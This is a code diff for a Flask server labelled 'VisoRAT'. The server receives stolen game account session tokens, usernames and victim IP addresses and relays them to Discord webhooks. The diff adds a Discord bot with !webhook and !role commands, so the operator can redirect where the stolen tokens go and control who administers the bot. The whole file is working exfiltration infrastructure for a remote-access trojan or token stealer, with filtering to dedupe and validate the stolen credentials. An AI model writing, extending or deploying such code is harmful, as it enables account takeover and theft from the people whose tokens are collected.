@@ -4,16 +4,31 @@ import json
 import os
 import time
 from datetime import datetime
+import discord
+from discord.ext import commands
+import threading
+import asyncio
 
 app = Flask(__name__)
 
 ip_requests = {}
 seen_tokens = set()
+config = None  # Global config, reloadable
 
 def load_config():
+    global config
     try:
-        with open('config.json', 'r') as f:
-            return json.load(f)
+        with open('config.json', 'r') as f: 
+            config = json.load(f)
+        # Validate Discord section
+        if 'discord' not in config:
+            config['discord'] = {
+                "bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE",
+                "admin_role_id": 1234567890123456789,
+                "guild_id": 1234567890123456789
+            }
+            save_config()
+        return config
     except FileNotFoundError:
         print("ERROR: config.json not found! Creating template...")
         default_config = {
@@ -27,22 +42,55 @@ def load_config():
                     "webhooks": [
                         {
                             "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
-                            "name": "VisoRAT",
+                            "name": "Webhook 1",
+                            "footer": "VisoRAT",
+                            "color": 7414964,
+                            "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                        },
+                        {
+                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                            "name": "Webhook 2",
+                            "footer": "VisoRAT",
+                            "color": 7414964,
+                            "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                        }
+                    ]
+                },
+                "/auth": {
+                    "webhooks": [
+                        {
+                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                            "name": "Webhook 3",
                             "footer": "VisoRAT",
                             "color": 7414964,
                             "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                         }
                     ]
                 }
+            },
+            "discord": {
+                "bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE",
+                "admin_role_id": 1234567890123456789,
+                "guild_id": 1234567890123456789
             }
         }
         with open('config.json', 'w') as f:
             json.dump(default_config, f, indent=4)
-        print("Created config.json template. Please configure your webhook URLs.")
-        return default_config
+        print("Created config.json template. Please configure your webhook URLs and bot token.")
+        config = default_config
+        return config
     except json.JSONDecodeError:
         print("ERROR: Invalid config.json format!")
         return None
+
+def save_config():
+    global config
+    if config:
+        with open('config.json', 'w') as f:
+            json.dump(config, f, indent=4)
+        print("Config saved successfully.")
+
+# ... (Keep all your existing functions: get_client_ip, validate_player_head, is_rate_limited, is_duplicate_token, validate_request_data, send_to_discord_webhook, send_to_all_webhooks, cleanup_old_ips unchanged) ...
 
 def get_client_ip():
     if request.headers.get('X-Forwarded-For'):
@@ -197,55 +245,134 @@ def send_to_all_webhooks(endpoint_config, username, ip, token, endpoint_path, he
     
     return results
 
-config = load_config()
-if config and 'endpoints' in config:
-    endpoints = config.get('endpoints', {})
-    security_config = config.get('security', {})
-    
-    for endpoint_path, endpoint_config in endpoints.items():
-        clean_path = endpoint_path.strip('/')
+# Flask endpoint creation (unchanged, but uses global config)
+def setup_endpoints():
+    global config
+    if config and 'endpoints' in config:
+        endpoints = config.get('endpoints', {})
+        security_config = config.get('security', {})
         
-        def create_endpoint_handler(config=endpoint_config, path=clean_path, security=security_config):
-            def handler():
-                data = request.json
+        for endpoint_path, endpoint_config in endpoints.items():
+            clean_path = endpoint_path.strip('/')
+            
+            def create_endpoint_handler(config=endpoint_config, path=clean_path, security=security_config):
+                def handler():
+                    data = request.json
 
-                required_fields = ['username', 'token']
-                if not data or not all(field in data for field in required_fields):
+                    required_fields = ['username', 'token']
+                    if not data or not all(field in data for field in required_fields):
+                        return jsonify({
+                            "status": "error",
+                            "message": f"Missing required fields. Expected: {required_fields}",
+                            "endpoint": path
+                        }), 400
+
+                    username = data.get('username')
+                    token = data.get('token')
+                    
+                    ip = get_client_ip()
+
+                    print(f"Received on {path} - Username: {username}, IP: {ip}, Token length: {len(token) if token else 0}")
+
+                    validation_errors, head_image_url = validate_request_data(username, token, ip, security)
+                    if validation_errors:
+                        return jsonify({
+                            "status": "error",
+                            "endpoint": path,
+                            "errors": validation_errors
+                        }), 400
+
+                    webhook_results = send_to_all_webhooks(config, username, ip, token, path, head_image_url)
+
                     return jsonify({
-                        "status": "error",
-                        "message": f"Missing required fields. Expected: {required_fields}",
-                        "endpoint": path
-                    }), 400
-
-                username = data.get('username')
-                token = data.get('token')
-                
-                ip = get_client_ip()
-
-                print(f"Received on {path} - Username: {username}, IP: {ip}, Token length: {len(token) if token else 0}")
-
-                validation_errors, head_image_url = validate_request_data(username, token, ip, security)
-                if validation_errors:
-                    return jsonify({
-                        "status": "error",
+                        "status": "success",
                         "endpoint": path,
-                        "errors": validation_errors
-                    }), 400
+                        "webhooks_sent": len([r for r in webhook_results if r['success']]),
+                        "webhooks_total": len(webhook_results),
+                        "webhook_results": webhook_results
+                    }), 200
+                return handler
+            
+            handler_func = create_endpoint_handler()
+            app.add_url_rule(f'/{clean_path}', endpoint=f'endpoint_{clean_path}', view_func=handler_func, methods=['POST'])
+            print(f"Created endpoint: /{clean_path}")
 
-                webhook_results = send_to_all_webhooks(config, username, ip, token, path, head_image_url)
+# Discord Bot Setup
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
 
-                return jsonify({
-                    "status": "success",
-                    "endpoint": path,
-                    "webhooks_sent": len([r for r in webhook_results if r['success']]),
-                    "webhooks_total": len(webhook_results),
-                    "webhook_results": webhook_results
-                }), 200
-            return handler
-        
-        handler_func = create_endpoint_handler()
-        app.add_url_rule(f'/{clean_path}', endpoint=f'endpoint_{clean_path}', view_func=handler_func, methods=['POST'])
-        print(f"Created endpoint: /{clean_path}")
+@bot.event
+async def on_ready():
+    print(f'Bot logged in as {bot.user}')
+
+@bot.command(name='webhook')
+async def webhook_cmd(ctx, *args):
+    # Permission check
+    guild = bot.get_guild(config['discord']['guild_id'])
+    if not guild:
+        await ctx.send("❌ Bot not in the specified guild.")
+        return
+    user_roles = [role.id for role in ctx.author.roles]
+    admin_role_id = config['discord']['admin_role_id']
+    if admin_role_id not in user_roles:
+        await ctx.send("❌ You don't have permission to use this command. (Admin role required)")
+        return
+
+    if len(args) < 6:  # At least 3 URLs + optional names
+        await ctx.send("❌ Usage: `!webhook <url1> [name1] <url2> [name2] <url3> [name3]`\n(Webhook 1/2 for /receive, 3 for /auth)")
+        return
+
+    try:
+        # Parse args: url1, [name1], url2, [name2], url3, [name3]
+        idx = 0
+        webhook1 = {'url': args[idx], 'name': args[idx+1] if idx+1 < len(args) and not args[idx+1].startswith('http') else 'Webhook 1'}
+        idx += 2 if idx+1 < len(args) and not args[idx+1].startswith('http') else 1
+        webhook2 = {'url': args[idx], 'name': args[idx+1] if idx+1 < len(args) and not args[idx+1].startswith('http') else 'Webhook 2'}
+        idx += 2 if idx+1 < len(args) and not args[idx+1].startswith('http') else 1
+        webhook3 = {'url': args[idx], 'name': args[idx+1] if idx+1 < len(args) and not args[idx+1].startswith('http') else 'Webhook 3'}
+
+        # Update config
+        config['endpoints']['/receive']['webhooks'] = [
+            {**webhook1, 'footer': 'VisoRAT', 'color': 7414964, 'avatar_url': 'https://bigrat.monster/media/bigrat.jpg'},
+            {**webhook2, 'footer': 'VisoRAT', 'color': 7414964, 'avatar_url': 'https://bigrat.monster/media/bigrat.jpg'}
+        ]
+        config['endpoints']['/auth']['webhooks'] = [
+            {**webhook3, 'footer': 'VisoRAT', 'color': 7414964, 'avatar_url': 'https://bigrat.monster/media/bigrat.jpg'}
+        ]
+        save_config()
+        await ctx.send(f"✅ Webhooks updated!\n1: {webhook1['name']} ({webhook1['url'][:30]}...)\n2: {webhook2['name']} ({webhook2['url'][:30]}...)\n3: {webhook3['name']} ({webhook3['url'][:30]}...)")
+        print("Webhooks updated via Discord bot.")
+    except Exception as e:
+        await ctx.send(f"❌ Error updating webhooks: {str(e)}")
+        print(f"Webhook command error: {e}")
+
+@bot.command(name='role')
+async def role_cmd(ctx, role_id: int):
+    # Permission check (same as above)
+    guild = bot.get_guild(config['discord']['guild_id'])
+    if not guild:
+        await ctx.send("❌ Bot not in the specified guild.")
+        return
+    user_roles = [role.id for role in ctx.author.roles]
+    admin_role_id = config['discord']['admin_role_id']
+    if admin_role_id not in user_roles:
+        await ctx.send("❌ You don't have permission to use this command. (Admin role required)")
+        return
+
+    config['discord']['admin_role_id'] = role_id
+    save_config()
+    await ctx.send(f"✅ Admin role updated to ID: {role_id}")
+    print(f"Admin role updated to {role_id} via Discord bot.")
+
+def run_bot():
+    global config
+    if config and config.get('discord', {}).get('bot_token', '').startswith('YOUR_'):
+        print("ERROR: Bot token not configured in config.json!")
+        return
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(bot.start(config['discord']['bot_token']))
 
 def cleanup_old_ips():
     current_time = time.time()
@@ -256,22 +383,28 @@ def cleanup_old_ips():
 
 if __name__ == '__main__':
     config = load_config()
-    if config and 'endpoints' in config:
+    if config:
+        setup_endpoints()
+        
         print("\nConfigured endpoints:")
         for endpoint in config['endpoints'].keys():
             webhook_count = len(config['endpoints'][endpoint].get('webhooks', []))
             print(f"  {endpoint} -> {webhook_count} webhook(s)")
-    
-    if config and 'security' in config:
-        security = config['security']
-        print("\nSecurity settings:")
-        print(f"  Rate limit: {security.get('rate_limit_seconds', 600)} seconds")
-        print(f"  Min token length: {security.get('min_token_length', 128)} characters")
-        print(f"  Check duplicate tokens: {security.get('check_duplicate_tokens', True)}")
-        print("  Username validation: Via player head API")
+        
+        if config and 'security' in config:
+            security = config['security']
+            print("\nSecurity settings:")
+            print(f"  Rate limit: {security.get('rate_limit_seconds', 600)} seconds")
+            print(f"  Min token length: {security.get('min_token_length', 128)} characters")
+            print(f"  Check duplicate tokens: {security.get('check_duplicate_tokens', True)}")
+            print("  Username validation: Via player head API")
+        
+        # Start Discord bot in background thread
+        bot_thread = threading.Thread(target=run_bot, daemon=True)
+        bot_thread.start()
+        print("\nDiscord bot starting... (Use !webhook and !role in your server)")
     
     import os
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
-
 
